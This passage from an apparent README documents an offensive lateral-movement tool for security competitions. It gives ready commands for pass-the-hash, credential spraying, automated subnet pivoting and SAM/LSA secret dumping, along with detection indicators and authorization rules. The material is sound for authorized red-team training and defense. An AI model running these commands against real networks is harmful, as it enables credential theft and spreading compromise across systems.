```

### Verify Installation

```bash
python3 lateral_movement_tool.py --help
```

## 📖 Quick Start

### Basic Authentication Test
```bash
./lateral_movement_tool.py \
    -t 192.168.1.100 \
    -u administrator \
    -p "Password123!" \
    -d CORP \
    -v
```

### Automated Lateral Movement
```bash
./lateral_movement_tool.py \
    -t 192.168.1.100 \
    -u administrator \
    -p "Password123!" \
    -d CORP \
    --subnet 192.168.1.0/24 \
    --auto-pivot \
    --max-depth 3 \
    -o report.json
```

### Pass-the-Hash
```bash
./lateral_movement_tool.py \
    -t 192.168.1.100 \
    -u administrator \
    -H ":31d6cfe0d16ae931b73c59d7e0c089c0" \
    -d CORP
```

### Credential Spraying
```bash
./lateral_movement_tool.py \
    --targets targets.txt \
    --creds-file creds.json \
    --spray
```

## 🎯 Competition Workflow

### Phase 1: Initial Foothold
```bash
# Test your initial credentials
./lateral_movement_tool.py -t <TARGET> -u <USER> -p <PASS> -d <DOMAIN> -v
```

### Phase 2: Automated Expansion
```bash
# Launch automated lateral movement
./lateral_movement_tool.py \
    -t <TARGET> \
    -u <USER> \
    -p <PASS> \
    -d <DOMAIN> \
    --subnet <NETWORK>/24 \
    --auto-pivot \
    --max-depth 3 \
    -o phase2_report.json
```

### Phase 3: Credential Harvesting
```bash
# Discovered credentials are saved to:
cat discovered_creds.json

# Use them for further attacks
./lateral_movement_tool.py --spray --creds-file discovered_creds.json --targets targets.txt
```

## 🛠️ Technical Details

### How It Works

1. **Initial Authentication**: Establishes SMB connection with provided credentials
2. **Enumeration**: Discovers shares, logged-on users, and system information
3. **Credential Harvesting**: Dumps SAM/LSA secrets using RPC calls
4. **Credential Spraying**: Tests all credentials against all discovered hosts
5. **Recursive Pivoting**: Repeats process on newly compromised systems
6. **Reporting**: Generates comprehensive JSON reports

### Lateral Movement Techniques Used

- **Pass-the-Hash (PtH)**: NTLM authentication without password
- **Credential Spraying**: One password across many accounts
- **SMB Authentication**: Direct SMB login testing
- **RPC Secret Dumping**: SAM/LSA extraction via remote registry
- **Share Enumeration**: Network share discovery
- **User Enumeration**: Active session identification

### Protocols and Ports

- **TCP 445**: SMB (primary)
- **TCP 139**: NetBIOS/SMB
- **TCP 135**: RPC Endpoint Mapper
- **TCP 389**: LDAP (DC identification)

## 🔐 Security Considerations

### Operational Security (OPSEC)

This tool generates **significant network noise**:
- Multiple SMB connections
- RPC calls to remote systems
- Authentication attempts (may trigger alerts)
- Windows Event Logs on target systems

### Detection Indicators

Defenders can detect this tool through:
- Event ID 4625 (Failed logons)
- Event ID 4624 (Successful logons from unusual sources)
- Multiple SMB connections from single IP
- SAMR/LSA RPC queries
- Share enumeration activity

### Best Practices

✅ **DO:**
- Get written authorization before testing
- Stay within defined scope
- Document all activities
- Use strong operational security
- Report findings professionally

❌ **DON'T:**
- Use against systems you don't own/have permission to test
- Exceed defined scope or testing windows
- Leave backdoors or persistence mechanisms
- Cause denial of service
- Access or modify data without authorization

## 🐛 Troubleshooting

### Common Issues

**Connection Refused**
```bash
# Check target is up and SMB is accessible
nmap -p445 <TARGET>
```

**Authentication Failed**
```bash
# Verify credentials manually
smbclient -L //<TARGET> -U '<DOMAIN>\<USER>%<PASS>'
```

**Import Errors**
```bash
# Reinstall impacket
pip3 install --upgrade impacket
```

See [DOCUMENTATION.md](DOCUMENTATION.md) for detailed troubleshooting.
